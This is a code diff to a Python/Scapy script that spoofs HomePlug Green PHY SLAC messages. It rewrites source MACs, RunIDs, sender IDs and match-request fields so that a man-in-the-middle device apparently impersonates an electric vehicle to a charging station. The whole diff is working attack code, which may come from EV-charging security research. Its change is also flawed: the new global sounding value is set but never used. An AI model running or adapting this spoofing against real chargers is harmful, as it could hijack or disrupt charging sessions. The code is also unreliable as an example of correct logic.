@@ -3,11 +3,16 @@ from scapy.all import Ether
 from scapy.contrib.homepluggp import CM_SLAC_PARM_REQ, CM_START_ATTEN_CHAR_IND, CM_MNBC_SOUND_IND, CM_ATTEN_CHAR_RSP, CM_SLAC_MATCH_REQ
 from general_simulate_packets import send_packet, str_with_colon_to_bytes
 
+random_sounding_value = None
+
 def duplicate_parm_req(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id):
+    global random_sounding_value
     if packet.haslayer(Ether) and packet.haslayer(CM_SLAC_PARM_REQ):
         packet[Ether].src = mitm_ev_mac
         packet[CM_SLAC_PARM_REQ].RunID = str_with_colon_to_bytes(mitm_ev_run_id)
         send_packet(packet, sending_interface)
+        # reset random sounding value for the next slac session to use a different one every time
+        random_sounding_value = None
 
 def duplicate_start_atten_char_ind(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id):
     if packet.haslayer(Ether) and packet.haslayer(CM_START_ATTEN_CHAR_IND):
@@ -17,10 +22,13 @@ def duplicate_start_atten_char_ind(packet, sending_interface, mitm_ev_mac, mitm_
         send_packet(packet, sending_interface)
 
 def duplicate_mnbc_sound_ind(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id):
+    global random_sounding_value
     if packet.haslayer(Ether) and packet.haslayer(CM_MNBC_SOUND_IND):
         packet[Ether].src = mitm_ev_mac
         packet[CM_MNBC_SOUND_IND].RunID = str_with_colon_to_bytes(mitm_ev_run_id)
         packet[CM_MNBC_SOUND_IND].SenderID = str_with_colon_to_bytes(mitm_ev_sender_id)
+        if not random_sounding_value:
+            random_sounding_value = get_random_sounding_value()
         random_bytes = get_random_sounding_value()
         packet[CM_MNBC_SOUND_IND].RandomValue = random_bytes
         send_packet(packet, sending_interface)
@@ -40,9 +48,9 @@ def duplicate_cm_slac_match_req(packet, sending_interface, mitm_ev_mac, mitm_ev_
     if packet.haslayer(Ether) and packet.haslayer(CM_SLAC_MATCH_REQ):
         packet[Ether].src = mitm_ev_mac
         packet[Ether].dst = original_evse_mac
-        packet[CM_SLAC_MATCH_REQ].VariableField.EVID = mitm_ev_sender_id
+        packet[CM_SLAC_MATCH_REQ].VariableField.EVID = str_with_colon_to_bytes(mitm_ev_sender_id)
         packet[CM_SLAC_MATCH_REQ].VariableField.EVMAC = mitm_ev_mac
         packet[CM_SLAC_MATCH_REQ].VariableField.EVSEID = original_evse_id
         packet[CM_SLAC_MATCH_REQ].VariableField.EVSEMAC = original_evse_mac
-        packet[CM_SLAC_MATCH_REQ].VariableField.RunID = mitm_ev_run_id
+        packet[CM_SLAC_MATCH_REQ].VariableField.RunID = str_with_colon_to_bytes(mitm_ev_run_id)
         send_packet(packet, sending_interface)
